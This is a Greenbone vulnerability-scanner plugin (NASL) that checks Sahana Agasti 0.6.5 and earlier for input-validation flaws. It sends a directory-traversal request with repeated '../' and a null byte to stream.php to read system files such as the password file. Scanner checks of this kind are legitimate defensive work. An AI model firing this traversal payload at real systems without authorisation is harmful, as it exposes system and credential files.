# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103038");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-01-21 13:34:43 +0100 (Fri, 21 Jan 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_name("Sahana Agasti Multiple Input Validation Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("sahana_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sahana/detected");

  script_tag(name:"solution", value:"Vendor updates are available. Please contact the vendor for details.");

  script_tag(name:"summary", value:"Sahana Agasti is prone to multiple input-validation vulnerabilities
  because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the webserver process,
  which may aid in redirecting users to a potentially malicious site. This may allow the attacker to
  compromise the application and the computer and may aid in phishing attacks. Other attacks are also possible.");

  script_tag(name:"affected", value:"Sahana Agasti versions 0.6.5 and prior are vulnerable.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45730");
  script_xref(name:"URL", value:"http://www.sahanafoundation.org/Sahana066");
  script_xref(name:"URL", value:"https://launchpad.net/sahana-agasti/");
  script_xref(name:"URL", value:"http://www.sahanafoundation.org/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

CPE = "cpe:/a:sahana:sahana";

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/www/stream.php?mod=", crap(data:"../", length:3*9), files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(url:url, port:port);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
